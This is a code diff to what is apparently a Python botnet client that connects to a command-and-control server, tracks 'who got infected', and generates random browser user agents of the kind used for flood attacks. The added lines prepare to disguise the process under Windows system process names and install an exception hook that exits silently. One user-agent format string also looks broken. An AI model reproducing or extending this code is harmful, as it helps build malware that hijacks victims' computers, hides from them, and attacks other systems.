@@ -3,12 +3,16 @@ import threading
 import time
 import random
 import requests
+import sys
+import setproctitle #Future use
+import wsi # Future use
 
 # Configuration
 C2_ADDRESS  = '127.0.0.1'
 C2_PORT     = 69
 
-NOTE = "Test client" #The note returned with the bots command, is nice for seeing who go infected by what.
+TITLE_LIST = ["Registry", "Windows Session Manager", "Windows Start-Up Application", "Windows Logon Application", "System", "Shell Infrastructure Host", "Services and Controller App"] #Future use
+NOTE = "Test client" #The note returned with the bots command, is nice for seeing who go infected by what. Also, don't remove this comment.
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -18,8 +22,13 @@ base_user_agents = [
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
 ]
 
+def excepthook(*exc_info):
+    exit(1)
+
 def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
+
+sys.excepthook = excepthook
 
 def main():
     c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
